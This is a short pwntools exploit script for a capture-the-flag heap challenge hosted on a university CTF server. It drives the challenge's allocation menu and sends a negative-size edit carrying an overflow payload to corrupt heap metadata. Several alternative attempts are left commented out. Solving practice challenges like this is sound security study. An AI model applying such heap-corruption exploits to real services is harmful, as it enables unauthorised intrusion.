from pwn import *

# nc mitigations-are-awesome.ctf.umasscybersec.org 1337
elf = ELF("./chall")
#r = elf.process()
r = remote("mitigations-are-awesome.ctf.umasscybersec.org", 1337)
#input("press enter")


def alloc(size):
    r.sendlineafter(b" > What action do you want to take?\n", b"1")
    r.sendlineafter(b"What size should the allocation be?\n", str(size).encode())


def realloc(idx, size):
    r.sendlineafter(b" > What action do you want to take?\n", b"2")
    r.sendlineafter(b"What index do you wish to resize?\n", str(idx).encode())
    r.sendlineafter(b"What should the new size be?\n", str(size).encode())


def edit(idx, size, data):
    r.sendlineafter(b" > What action do you want to take?\n", b"3")
    r.sendlineafter(b"What index do you wish to edit?\n", str(idx).encode())
    r.sendlineafter(b"How many bytes do you want to write to the buffer?\n", str(size).encode())
    r.sendlineafter(b"What data do you want to write? Now be good and don't go out of bounds!\n", data)


def win():
    r.sendlineafter(b" > What action do you want to take?\n", b"4")


alloc(0x20)
alloc(32)
edit(0, -1, b"A" * (0x20)  +(p64(0x00)*7)+ p64(0x100)+ b'\x45\x7A\x20\x57\x00'*10)

#edit(1,0x1000, b"\x45\x7A\x20\x57"*(int(128/len("\x45\x7A\x20\x57")))+p64(0x20)+p64(0x0000)+p64(0x0002070a))

#alloc(128)
#realloc(2, 32)
# edit(1, 128 + 8 + 8 + 8 + 8, b'A' * (128 - 32) + p64(0x00) * 2 + p64(0x00) * 2 + p64(0x20))
# realloc(0, 0x30)
# realloc(0, 0x0)
# realloc(0, 0x20)
# win()

r.interactive()
